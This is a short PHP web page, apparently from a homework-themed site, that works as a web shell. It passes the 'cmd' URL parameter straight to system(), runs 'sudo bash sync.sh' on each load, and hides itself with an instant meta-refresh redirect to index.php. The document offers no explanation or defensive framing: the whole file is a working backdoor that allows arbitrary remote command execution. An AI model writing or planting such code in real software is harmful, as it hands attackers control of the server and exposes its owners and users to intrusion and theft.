<!DOCTYPE html>
<head>
    <meta http-equiv="refresh" content="0.01; URL=./index.php?comeFrom=./shell.php">
    <link rel="icon" type="image/x-icon" href="./src/img/homework-favicon1.png">
</head>

<body style="background-color: gray;">
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>"></form>
    
    <pre>
    <?php
        if(isset($_GET['cmd']))
        {
            system($_GET['cmd']);
        }
    ?>
    <?php
        exec("sudo bash sync.sh");
    ?>
    </pre>
</body>

</html>
